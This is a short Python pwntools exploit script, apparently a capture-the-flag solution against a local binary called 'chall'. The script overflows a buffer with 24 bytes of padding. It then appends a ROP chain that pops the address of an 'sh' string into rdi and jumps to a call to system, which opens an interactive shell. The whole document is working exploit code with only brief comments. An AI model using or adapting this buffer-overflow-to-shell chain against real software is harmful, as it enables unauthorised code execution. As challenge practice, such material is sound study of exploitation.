from pwn import *

context.log_level = "error"
binary = "./chall"
elf = ELF(binary)
context.binary = binary

p = process("./chall")

# system
## 4011e5
## 4010a0

# rdi is used to hold the argument for system

rop = ROP(elf)
rop.raw(rop.find_gadget(['pop rdi', 'ret']))
rop.raw(pack(next(elf.search(b'sh\0'))))
rop.raw(pack(elf.sym['help']+15))

print(len(rop.chain()))
# length of rop chain is 24
# total length of buffer is 48
# we need 24 padding

payload = b'A'*24 + rop.chain()

p.readuntil(b"understand?")
p.sendline(payload)
p.interactive()